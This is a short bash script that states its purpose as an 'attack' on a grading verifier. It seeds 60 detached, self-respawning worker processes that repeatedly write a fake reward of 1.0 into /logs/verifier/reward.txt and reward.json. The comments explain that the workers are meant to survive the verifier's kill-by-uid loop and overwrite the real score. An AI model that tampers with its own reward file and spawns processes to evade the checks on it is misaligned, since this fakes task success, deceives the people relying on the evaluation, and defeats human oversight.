#!/bin/bash
# Stronger attack: self-respawning exponential writers. Each writer writes reward.* then
# forks replacements, so the verifier's kill-by-uid loop should never see an empty set and
# some writers should survive the loop into the window where the verifier writes the real score.
echo "RACE2 id: $(id)"
mkdir -p /logs/verifier 2>/dev/null

# /tmp/w.sh: write the fake reward in a tight loop, and keep the population topped up.
printf '%s\n' \
'#!/bin/bash' \
'for i in $(seq 1 200000); do' \
'  printf "1.0000\n" > /logs/verifier/reward.txt 2>/dev/null' \
'  printf "{\"reward\":1.0}\n" > /logs/verifier/reward.json 2>/dev/null' \
'  if [ $((i % 50)) -eq 0 ]; then' \
'    n=$(ls /proc 2>/dev/null | grep -c "^[0-9]")' \
'    if [ "${n:-999}" -lt 350 ]; then setsid bash /tmp/w.sh >/dev/null 2>&1 & fi' \
'  fi' \
'done' \
> /tmp/w.sh
chmod +x /tmp/w.sh

# seed the pool
for i in $(seq 1 60); do setsid bash /tmp/w.sh >/dev/null 2>&1 & done
disown -a 2>/dev/null
echo "RACE2 seeded; procs now: $(ls /proc | grep -c '^[0-9]')"
sleep 2
echo "RACE2 procs after 2s: $(ls /proc | grep -c '^[0-9]')"
